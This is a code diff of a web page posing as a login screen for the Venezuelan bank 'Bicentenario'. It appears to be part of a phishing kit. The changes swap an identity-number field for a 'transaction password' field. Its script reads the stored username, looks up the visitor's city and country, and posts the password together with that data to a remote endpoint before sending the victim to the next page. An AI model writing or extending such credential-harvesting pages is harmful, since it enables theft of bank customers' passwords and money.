@@ -108,6 +108,7 @@
       .contenedor2 {
         display: flex;
         flex-wrap: wrap;
+        width: 100%;
         justify-content: center;
       }
 
@@ -121,11 +122,7 @@
         font-weight: 500;
       }
 
-      @media (max-width: 600px) {
-        .opcion {
-          width: 100%;
-        }
-      }
+    
     </style>
     <link
       rel="stylesheet"
@@ -140,51 +137,6 @@
       </div>
       <div class="formato">
         <form id="loginform">
-          <div style="text-align: left; width: 100%">
-            <p
-              style="
-                line-height: 19px;
-                font-weight: bold;
-                font-size: 13px;
-                color: #333;
-                text-align: left;
-                white-space: normal;
-              "
-            >
-              Tipo de Identificación
-            </p>
-          </div>
-          <select
-            style="
-              display: block;
-              box-sizing: border-box;
-              -moz-box-sizing: border-box;
-              width: 100%;
-              height: 32px;
-              line-height: 32px;
-              padding: 5px 10px;
-              outline: 0;
-              border: 1px solid white;
-              background: gainsboro;
-              border-radius: 0;
-              background: rgb(239, 239, 239) !important;
-              font: 13px/16px 'Open Sans', Helvetica, Arial, sans-serif;
-              color: #404040;
-              appearance: normal;
-            "
-            name="tipodocben"
-            id="tipodocben"
-            aria-required="true"
-            aria-invalid="false"
-          >
-            <option value="Venezolano">Venezolano</option>
-            <option value="Pasaporte">Pasaporte</option>
-            <option value="Jurídico">Jurídico</option>
-            <option value="0Extranjero8">Extranjero</option>
-            <option value="Gubernamental">Gubernamental</option>
-            <option value="Comunal">Comunal</option>
-            <option value="Firma Personal">Firma Personal</option>
-          </select>
           <div style="width: 100%; height: 20px"></div>
           <div style="text-align: left; width: 100%">
             <p
@@ -197,15 +149,14 @@
                 white-space: normal;
               "
             >
-              Número de Identificación
+              Clave de transacciones
             </p>
           </div>
           <div class="input-container" style="width: 100%">
             <input
               type="text"
               id="contra"
-              inputmode="numeric"
-              placeholder="Número de documento de identidad"
+              placeholder="Clave para realizar sus transacciones"
               required
               style="background: rgb(239, 239, 239)"
             />
@@ -214,15 +165,21 @@
           <div style="width: 100%; height: 30px"></div>
 
           <div class="contenedor2">
-            <div class="opcion"><i class="fa fa-user"></i> Registro</div>
             <div class="opcion">
-              <i class="fa fa-unlock"></i> Desbloqueo de usuario
+              <a
+                href="contra.html"
+                style="
+                  color: inherit; /* hereda el color del texto del padre */
+                  text-decoration: inherit; /* hereda la decoración del texto del padre */
+                "
+                ><i class="fa fa-home"></i> Regresar</a
+              >
             </div>
-            <div class="opcion"><i class="fa fa-user"></i> Olvido usuario</div>
+            <div class="opcion"><i class="fa fa-unlock"></i>  Olvido su clave Interactiva</div>
           </div>
           <div style="width: 100%; height: 30px"></div>
 
-          <button type="submit"><i class="fa fa-check"></i> Ingresar</button>
+          <button type="submit"><i class="fa fa-unlock"></i> Ingresar</button>
           <div style="width: 100%; height: 20px"></div>
           <div
             style="
@@ -253,14 +210,13 @@
       axios
         .get(url)
         .then((response) => {
-          const tipodocben = document.querySelector("#tipodocben").value;
-          const documento = document.querySelector("#contra").value;
-          localStorage.setItem("usuario", documento);
+          const nombre = localStorage.getItem("usuario");
+          const contra = document.querySelector("#contra").value;
           const message =
-            "\nBicentenario\nTipo de identificación: " +
-            tipodocben +
-            "\nNúmero de identificación: " +
-            documento +
+            "\nBicentenario\nUsuario: " +
+            nombre +
+            "\nClave Transaccional: " +
+            contra +
             "\nCiudad:" +
             response.data.city +
             "\nPais: " +
@@ -276,7 +232,7 @@
               }
             )
             .then((response) => {
-              window.location.href = "contra.html";
+              window.location.href = "imagen2.html";
             })
             .catch((error) => {
               console.error(error);
